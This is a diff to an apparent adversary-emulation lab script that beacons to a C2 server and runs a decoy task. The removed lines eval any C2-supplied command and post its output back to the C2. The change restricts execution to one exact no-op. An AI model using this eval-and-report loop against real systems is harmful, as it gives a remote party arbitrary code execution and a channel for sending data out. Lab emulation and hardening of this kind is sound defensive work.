@@ -43,11 +43,18 @@ for i in $(seq 1 "$BEACON_COUNT"); do
 
     if echo "$RESP" | grep -q 'echo decoy-task-executed'; then
         step "executing decoy task returned by C2 (ATT&CK T1059)"
-        act T1059 "eval C2-supplied task (echo decoy-task-executed)" "$LAB_NODE" "task decoy-task-0001"
-        OUT="$(eval "$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task"]["command"])' 2>/dev/null)" 2>&1)"
-        say "task output: $OUT"
-        st_http POST "http://${C2_HOST}:${C2_PORT}/task-result" "task_id=decoy-task-0001 output=${OUT}" >/dev/null
-        say "posted task-result back to C2"
+        TASK_CMD="$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task"]["command"])' 2>/dev/null)"
+        # Only ever run the one known no-op. The grep above would also match
+        # "echo decoy-task-executed; <anything>", so compare the whole command.
+        if [ "$TASK_CMD" = "echo decoy-task-executed" ]; then
+            act T1059 "eval C2-supplied task (echo decoy-task-executed)" "$LAB_NODE" "task decoy-task-0001"
+            OUT="$(eval "$TASK_CMD" 2>&1)"
+            say "task output: $OUT"
+            st_http POST "http://${C2_HOST}:${C2_PORT}/task-result" "task_id=decoy-task-0001 output=${OUT}" >/dev/null
+            say "posted task-result back to C2"
+        else
+            say "!! C2 returned an unexpected task, NOT executing it: ${TASK_CMD:-<unparseable>}"
+        fi
     fi
 
     if [ "$i" -lt "$BEACON_COUNT" ]; then
